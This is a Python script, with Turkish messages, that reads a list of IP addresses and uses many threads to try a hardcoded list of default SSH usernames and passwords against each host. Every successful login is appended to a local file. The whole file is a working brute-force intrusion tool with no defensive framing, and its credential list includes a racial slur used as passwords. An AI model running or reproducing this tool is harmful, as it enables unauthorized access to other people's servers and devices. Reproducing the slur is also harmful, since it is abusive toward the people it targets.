import paramiko
from socket import timeout
import sys
import concurrent.futures

def test_ssh_connection(ip_address, username, password, success_set):
    port = 22

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        if ip_address not in success_set:
            ssh_client.connect(ip_address, port, username, password, timeout=5)

            result = f"{ip_address}:{username}:{password}\n"
            print(result)
            with open('work.txt', 'a') as work_file:
                work_file.write(result)

            success_set.add(ip_address)

    except timeout:
        print(f"Bağlantı zaman aşımına uğradı. Bağlantı başarısız. IP: {ip_address}")

    except paramiko.AuthenticationException:
        print(f"Kimlik doğrulama hatası. Kullanıcı adı veya şifre yanlış. IP: {ip_address}")

    except paramiko.SSHException as e:
        print(f"SSH bağlantısı hatası: {ip_address}")

    finally:
        ssh_client.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Kullanım: python3 main.py FileName Threads")
        sys.exit(1)

    dosya_adı = sys.argv[1]
    aynı_anda_bağlantı_sayısı = int(sys.argv[2])

    try:
        with open(dosya_adı, 'r') as file:
            ip_addresses = file.read().splitlines()
    except FileNotFoundError:
        print(f"Dosya bulunamadı: {dosya_adı}")
        sys.exit(1)

    credentials = [
        ("fake", "fake"),
        ("ubnt", "ubnt"),
        ("root", "root"),
        ("admin", "admin"),
        ("user", "user"),
        ("admin", "1234"),
        ("root", "centos"),
        ("pi", "raspberry"),
        ("pi", "pi"),
        ("root", "admin"),
        ("root", "password"),
        ("hi1", "hi2"),
        ("root", "admin"),
        ("root", "root"),
        ("root", "1234"),
        ("root", "12345"),
        ("root", "ubnt"),
        ("root", "54321"),
        ("root", "4321"),
        ("root", "uClinux"),
        ("root", "administrator"),
        ("root", "nigger"),
        ("root", "nigger12345"),
        ("root", "VXrepNwVm8vxFqMS"),
        ("ubnt", "ubnt"),
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "12345"),
        ("admin", "VXrepNwVm8vxFqMS"),
        ("bin", "bin"),
        ("pi", "raspberry"),
        ("telnet", "telnet"),
        ("admin", "12345678"),
    ]

    success_set = set()

    with concurrent.futures.ThreadPoolExecutor(max_workers=aynı_anda_bağlantı_sayısı) as executor:
        for ip_address in ip_addresses:
            for username, password in credentials:
                executor.submit(test_ssh_connection, ip_address, username, password, success_set)
